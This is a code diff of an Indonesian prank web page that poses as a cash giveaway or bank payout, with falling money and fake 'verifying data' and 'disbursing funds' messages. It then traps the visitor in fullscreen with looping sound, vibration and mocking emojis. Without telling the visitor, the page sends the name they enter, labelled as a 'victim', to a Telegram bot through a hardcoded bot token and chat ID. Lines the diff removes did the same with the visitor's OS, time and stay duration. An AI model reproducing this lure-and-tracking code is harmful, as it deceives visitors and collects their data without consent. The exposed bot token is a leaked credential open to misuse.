@@ -21,20 +21,18 @@
         #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; }
         
         /* LOADING OVERLAY */
-        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 50; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 50; flex-direction: column; align-items: center; justify-content: center; overflow: hidden; }
         .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; z-index: 10; }
-        #status-text { margin-top: 20px; font-weight: bold; color: #15803d; z-index: 10; position: relative; background: rgba(255,255,255,0.8); padding: 5px 10px; border-radius: 5px; }
-        
+        #status-text { margin-top: 20px; font-weight: bold; color: #15803d; z-index: 10; }
+
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* ANIMASI DUIT */
+        /* ANIMASI DUIT & PARTIKEL */
         .money { position: absolute; top: -50px; user-select: none; z-index: 1; animation: fall linear forwards; }
         @keyframes fall { to { transform: translateY(105vh) rotate(360deg); } }
-
-        /* ANIMASI PARTIKEL PRANK */
-        .particle { position: absolute; user-select: none; pointer-events: none; animation: popOut linear forwards; }
+        .particle { position: absolute; user-select: none; pointer-events: none; animation: popOut 2s linear forwards; }
         @keyframes popOut {
-            0% { transform: translate(-50%, -50%) scale(0) rotate(0deg); opacity: 1; }
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 1; }
             100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; }
         }
     </style>
@@ -55,7 +53,7 @@
     <div id="loading-overlay">
         <div id="money-container"></div>
         <div class="spinner"></div>
-        <p id="status-text">Menghubungkan ke server bank...</p>
+        <p id="status-text">Menghubungkan ke server...</p>
     </div>
 
     <div id="prank-screen" onclick="closePrank()">
@@ -77,102 +75,73 @@
 
         const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
         const TELE_ID = '7267912519'; 
-
         const startTime = Date.now();
-        let loopPrank; // Variabel buat simpen interval loop
+        let loopPrank, moneyInterval;
 
         function startMoneyRain() {
-            const emojis = ['💸', '💰', '💵', '🤑', '💎'];
             moneyInterval = setInterval(() => {
                 const money = document.createElement('div');
                 money.classList.add('money');
-                money.innerText = emojis[Math.floor(Math.random() * emojis.length)];
+                money.innerText = '💸';
                 money.style.left = Math.random() * 100 + 'vw';
-                money.style.fontSize = Math.random() * 20 + 20 + 'px';
-                money.style.animationDuration = Math.random() * 3 + 2 + 's';
+                money.style.animationDuration = '3s';
                 moneyContainer.appendChild(money);
-                setTimeout(() => { money.remove(); }, 5000);
+                setTimeout(() => money.remove(), 3000);
             }, 150);
         }
 
         function burstParticles() {
-            const emojis = ['😂', '🤣', '🤪', '🐒', '🙊', '☠️', '🤡', '🤮', '🤬'];
-            const particleCount = 40; // Gue kurangin dikit biar gak lag pas loop
-
-            for (let i = 0; i < particleCount; i++) {
-                const particle = document.createElement('div');
-                particle.classList.add('particle');
-                particle.innerText = emojis[Math.floor(Math.random() * emojis.length)];
-                particle.style.left = '50%';
-                particle.style.top = '50%';
-
+            for (let i = 0; i < 40; i++) {
+                const p = document.createElement('div');
+                p.classList.add('particle');
+                p.innerText = ['😂','🤣','🐒','🤡'][Math.floor(Math.random()*4)];
+                p.style.left = '50%'; p.style.top = '50%';
                 const angle = Math.random() * Math.PI * 2;
                 const speed = Math.random() * 350 + 100;
-                const tx = Math.cos(angle) * speed + 'px';
-                const ty = Math.sin(angle) * speed + 'px';
-                
-                particle.style.setProperty('--tx', tx);
-                particle.style.setProperty('--ty', ty);
-                particle.style.setProperty('--s', Math.random() * 2 + 1);
-                particle.style.setProperty('--r', Math.random() * 360 + 360 + 'deg');
-                particle.style.animationDuration = '2s';
-                
-                particleContainer.appendChild(particle);
-                setTimeout(() => { particle.remove(); }, 2000);
+                p.style.setProperty('--tx', Math.cos(angle)*speed+'px');
+                p.style.setProperty('--ty', Math.sin(angle)*speed+'px');
+                p.style.setProperty('--s', Math.random()*2+2);
+                p.style.setProperty('--r', Math.random()*720+'deg');
+                particleContainer.appendChild(p);
+                setTimeout(() => p.remove(), 2000);
             }
-        }
-
-        window.onload = async () => {
-            if (!localStorage.getItem('thr_user_logged')) {
-                const ua = navigator.userAgent;
-                let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
-                const teksMasuk = `👀 ADA YANG INTIP LINK!\n📱 OS: ${os}\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
-                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teksMasuk)}`, { mode: 'no-cors' });
-                localStorage.setItem('thr_user_logged', 'true');
-            }
-        };
-
-        async function kirimLog(nama) {
-            const duration = Math.floor((Date.now() - startTime) / 1000);
-            const ua = navigator.userAgent;
-            let os = /android/i.test(ua) ? "Android" : (/iPhone|iPad|iPod/i.test(ua) ? "iOS" : "PC");
-            const teks = `🎯 KORBAN: ${nama}\n📱 OS: ${os}\n⏳ STAY: ${duration} Detik\n⏰ JAM: ${new Date().toLocaleTimeString()}`;
-            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent(teks)}`, { mode: 'no-cors' });
         }
 
         env.addEventListener('click', () => {
             const nama = nameInput.value.trim();
-            if (nama === "") { alert("Woi, isi nama dulu!"); return; }
+            if (nama === "") { alert("Isi nama dulu bos!"); return; }
 
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
+            prankSound.volume = 1.0;
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
             
-            kirimLog(nama);
+            fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=${encodeURIComponent('🎯 KORBAN GAS: '+nama)}`, { mode: 'no-cors' });
+
             loading.style.display = 'flex';
             startMoneyRain();
+
+            setTimeout(() => statusText.innerText = "Verifikasi data " + nama + "...", 1500);
+            setTimeout(() => statusText.innerText = "Proses pencairan dana...", 3500);
 
             setTimeout(() => {
                 clearInterval(moneyInterval);
                 loading.style.display = 'none';
                 prank.style.display = 'flex';
                 
-                // --- INI DIA LOOPNYA ---
-                burstParticles(); // Langsung meledak
-                loopPrank = setInterval(burstParticles, 2000); // Loop tiap 2 detik
+                burstParticles();
+                loopPrank = setInterval(burstParticles, 2000);
                 
                 prankSound.loop = true;
                 prankSound.play();
-                if (navigator.vibrate) navigator.vibrate([500, 100, 500]);
+                if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 1000]);
             }, 5500);
         });
 
         function closePrank() {
-            clearInterval(loopPrank); // Stop loop pas ditutup
+            clearInterval(loopPrank);
             prank.style.display = 'none';
             particleContainer.innerHTML = '';
             prankSound.pause();
             prankSound.currentTime = 0;
-            nameInput.value = "";
             if (document.exitFullscreen) document.exitFullscreen();
         }
     </script>
